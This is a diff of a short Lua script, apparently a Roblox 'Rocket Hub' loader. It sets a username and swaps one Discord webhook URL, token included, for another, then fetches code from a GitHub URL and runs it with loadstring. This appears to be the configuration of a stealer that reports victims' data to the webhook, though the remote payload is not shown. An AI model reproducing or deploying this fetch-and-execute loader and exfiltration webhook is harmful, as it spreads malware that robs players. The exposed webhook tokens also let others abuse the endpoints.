@@ -1,5 +1,5 @@
 _G.Username = "1Maron"
 _G.HubName = "Rocket Hub"
-_G.Webhook = "https://discord.com/api/webhooks/1095089463937482812/i9m16PDIOqXYfmksLXLJFV_zI0GDZeJSFgbdz5ocp7J_sypaomv2Fa8Ax2v4qkcWBf4Kt" 
+_G.Webhook = "https://discord.com/api/webhooks/1087465696864260176/LwjFqN6B40LSqiVI_3bsqN2Zkq204bRyZQkOOfd9Rk07VDTiVSQrUUBB4eEg3oq0WVEO" 
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Jayiioceanii/PeakOnTop/main/peak.lua"))()
